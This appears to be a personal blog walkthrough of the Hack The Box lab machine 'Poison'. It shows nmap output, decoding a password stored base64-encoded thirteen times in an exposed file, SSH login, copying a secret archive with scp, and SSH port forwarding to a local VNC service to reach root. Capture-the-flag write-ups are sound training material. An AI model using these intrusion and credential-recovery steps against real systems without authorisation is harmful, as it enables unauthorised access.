---
layout: post
title: "HTB-Poison"
categories: HTB-Walkthrough
---

![poison](/assets/img/poison.png)

As always, nmap first!

`nmap -sV -Pn --min-rate 10000 10.10.10.84`



```

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

```



Hmm webserver looks a bit dated...particularly the PHP 5.6.32 could be dangerous.

The page's source code gives a little info...



```html

<h1>Temporary website to test local .php scripts.</h1>
Sites to be tested: ini.php, info.php, listfiles.php, phpinfo.php

```



We've got a few things to look at here, first tried is info.php:



```

FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017
 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64

```



listfiles.php is exactly what we expect...



```

Array(    [0] => .    [1] => ..    [2] => browse.php    [3] => index.php    
[4] => info.php    [5] => ini.php    [6] => listfiles.php    
[7] => phpinfo.php    [8] => pwdbackup.txt

```



...wait...what?...pwdbackup.txt??? orly?



```

This password is secure, it's encoded atleast 13 times.. what could go wrong really..Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=

```



So we've got to decode this base64 13 times or so? 
I initially did this in python, but found a simpler more elegant solution [here](https://0xdf.gitlab.io/2018/09/08/htb-poison.html).

0xdf's walkthroughs are great to use with legacy htb boxes, but you've got to be careful not to spoil the box by reading too far ahead.
Its interesting to read up to the point where you are 'at' to check you're on the right path, or if the problem could have been solved a different way.

So copying his method here...

I saved the password as 'pass1'

```

data=$(cat pass1); for i in $(seq 1 13); do data=$(echo $data |tr -d '' |base64 -d);done;echo $data

```


My python version here...

```python

#!/usr/bin/python

from base64 import b64decode

str='Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo='

for i in range(13):
        str=b64decode(str)

print str

```


The output from these is the password...

`Charix!2#4%6&8(0`



We can try this out quickly on the ssh port (22)

`ssh charix@10.10.10.84`

It works!!!


In the user's home folder we find secret.zip, I decide to get it to my kali machine to play with.

scp is an useful tool when we know we can get ssh access.
so from my kali machine I do...

```

scp charix@10.10.10.84:/home/charix/secret.zip .
unzip secret.zip

```

I reuse the `Charix!2#4%6&8(0` password, and it works...
we get a file called secret.

Looking around again on the target I don't see much else going on, until i do
`ps aux` and see that tightvnc is running.
`netstat -an` shows it running on localhost.

We need to use port forwarding to access this...

from the target we do...

```

ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84

```

on Kali do...

`vncviewer 127.0.0.1:5901`

... its asking for a password, and wont accept the one we used earlier...
Im stumped momentarily until I try the following...

```

vncviewer 127.0.0.1:5901 -password secret

```


...it's using the secret file contents as password!?

we get gui vncviewer access and a shell as root....

![gui-root](/assets/img/poison-root.png)


